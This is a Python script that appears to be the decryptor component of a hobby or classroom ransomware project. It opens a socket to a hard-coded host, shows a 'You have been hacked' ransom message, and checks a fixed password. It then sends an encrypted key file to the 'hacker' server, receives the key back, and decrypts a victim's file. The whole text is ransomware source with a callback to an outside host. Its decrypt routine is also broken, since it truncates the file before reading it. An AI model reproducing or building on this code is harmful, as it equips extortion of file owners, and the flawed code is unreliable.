import socket
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

#s is a socket passed in
def sendEncryptedKey(eKeyFilePath, s):
   #with socket.create_connection(("1.1.1.3", 8000)) as sock:
	with open(eKeyFilePath, "rb") as file:
		line = file.read(1024)
		while (line):
			s.send(line)
			line = file.read(1024)

def decryptFile(filePath, key):
	print("sym key decrypted")
	print(key)
	#print(len(key))
	FernetInstance = Fernet(key)
	#print("Decrypted fernet instance")
	#print(FernetInstance)
	#testfile = "/home/michael/Desktop/test/testkey.txt"
	
	with open(filePath, "w+b") as file:
	
		#with open(testfile, "rb") as testf:
		#	ferntest = testf.read().decode()
	
		file_data = file.read() #was key param
		decrypted_data = FernetInstance.decrypt(file_data)
		file.write(decrypted_data)

with socket.create_connection(("1.1.1.3", 8000)) as s:

	s.send("it's decryptor".encode())
       
	gave_pw = False
	while gave_pw != True:
		print("You have been hacked! You are now a ransomware victim...")
		
		print("Enter password: ")
		guess = input()
		if guess == "Wahoo":
			gave_pw = True
			print("Correct! Decrypting...")
		else:
			print("WRONG!")

	#Send encrypted sym key to hacker
	sendEncryptedKey("/home/michael/Desktop/encryptedSymmertricKey.key", s)

	plaintext_sym_key = s.recv(1024)
	#print(type(plaintext_sym_key))
	
	decryptFile("/home/michael/Desktop/client_data.txt", plaintext_sym_key)
	
	print("Everything has now been restored. Be grateful I sent it back and say thank you! Cheers!")
	
	
	
